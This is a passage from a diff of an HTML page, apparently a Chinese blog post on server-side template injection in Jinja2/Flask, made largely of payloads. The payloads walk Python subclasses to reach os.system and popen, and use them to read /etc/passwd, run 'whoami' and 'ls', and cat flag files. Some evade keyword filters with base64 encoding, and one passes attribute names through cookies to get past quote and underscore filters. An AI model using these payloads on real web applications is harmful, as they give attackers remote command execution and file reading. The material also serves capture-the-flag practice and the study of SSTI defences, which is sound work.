-<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">59</span>).<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>).<span class="hljs-variable">__getitem__</span>(<span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)
+<div class="hljs"><pre><code class="hljs stylus">#getitem、pop
+<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<span class="hljs-selector-class">.read</span>()
+<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">59</span>).__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.linecache</span><span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>()
+<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">__subclasses__</span>().<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">59</span>).__init__.__globals__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>).<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)
 
-&#123;&#123;().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">0</span>).<span class="hljs-variable">__subclasses__</span>().<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">433</span>).<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()&#125;
+&#123;&#123;().__class__.__bases__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>).<span class="hljs-built_in">__subclasses__</span>().<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">433</span>).__init__.__globals__<span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<span class="hljs-selector-class">.read</span>()&#125;
 
-&#123;&#123;().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">433</span>).<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()&#125;&#125;
+&#123;&#123;().__class__.__base__.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">433</span>).__init__.__globals__<span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<span class="hljs-selector-class">.read</span>()&#125;&#125;
 </code></pre></div>
 
 <h3 id="过滤双花括号"><a href="#过滤双花括号" class="headerlink" title="过滤双花括号"></a>过滤双花括号</h3><div class="hljs"><pre><code class="hljs mel">#用&#123;%%&#125;标记
@@ -579,27 +577,27 @@ flag = f.read()</code></pre></div>
 <div class="hljs"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">print</span> request.application.__globals__.__getitem__(<span class="hljs-string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;__main__&#x27;</span>).flag %&#125;</code></pre></div>
 
 <h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><p>对关键字进行base64编码可绕过一些明文检测机制：</p>
-<div class="hljs"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-keyword">import</span> base64</span>
-<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">base64.b64encode(<span class="hljs-string">&#x27;__import__&#x27;</span>)</span>
+<div class="hljs"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> base64</span>
+<span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">base64.b64encode(<span class="hljs-string">&#x27;__import__&#x27;</span>)</span>
 &#x27;X19pbXBvcnRfXw==&#x27;
-<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">base64.b64encode(<span class="hljs-string">&#x27;os&#x27;</span>)</span>
+<span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">base64.b64encode(<span class="hljs-string">&#x27;os&#x27;</span>)</span>
 &#x27;b3M=&#x27;
-<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python">__builtins__.__dict__[<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)](<span class="hljs-string">&#x27;b3M=&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</span>
+<span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">__builtins__.__dict__[<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)](<span class="hljs-string">&#x27;b3M=&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</span>
 0</code></pre></div>
 
 
 
 <h2 id="过滤了-39-“-双花括号-args-values"><a href="#过滤了-39-“-双花括号-args-values" class="headerlink" title="过滤了 &#39;, “, [, ], _, 双花括号,args, values"></a>过滤了 &#39;, “, [, ], _, 双花括号,args, values</h2><p>过滤了单双引号导致调用函数时不能直接使用字符串常量，但是可以使用变量传值，比如cookies或者 headers(不能使用get或方法ost)，过滤下划线可以使用管道符外加调用attr()方法来绕过。</p>
 <p>payload</p>
-<div class="hljs"><pre><code class="hljs vbscript">url?args=
-&#123;%pr<span class="hljs-built_in">int</span>((()|attr(<span class="hljs-built_in">request</span>.cookies.a)|attr(<span class="hljs-built_in">request</span>.cookies.b)|attr(<span class="hljs-built_in">request</span>.cookies
-.c)()|attr(<span class="hljs-built_in">request</span>.cookies.d)
-(<span class="hljs-number">132</span>)|attr(<span class="hljs-built_in">request</span>.cookies.e)|attr(<span class="hljs-built_in">request</span>.cookies.f)|attr(<span class="hljs-built_in">request</span>.cookies.d)
-(<span class="hljs-built_in">request</span>.cookies.g))(<span class="hljs-built_in">request</span>.cookies.h).read())%&#125;
-Cookie: h=cat
-f*;a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals_
-_;g=popen
-</code></pre></div>
+<div class="hljs"><pre><code class="hljs django"><span class="language-xml">url?args=</span>
+<span class="language-xml"></span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span>((()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies</span>
+<span class="hljs-template-tag">.c)()|attr(request.cookies.d)</span>
+<span class="hljs-template-tag">(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)</span>
+<span class="hljs-template-tag">(request.cookies.g))(request.cookies.h).read())%&#125;</span><span class="language-xml"></span>
+<span class="language-xml">Cookie: h=cat</span>
+<span class="language-xml">f*;a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals_</span>
+<span class="language-xml">_;g=popen</span>
+<span class="language-xml"></span></code></pre></div>
 
 
 
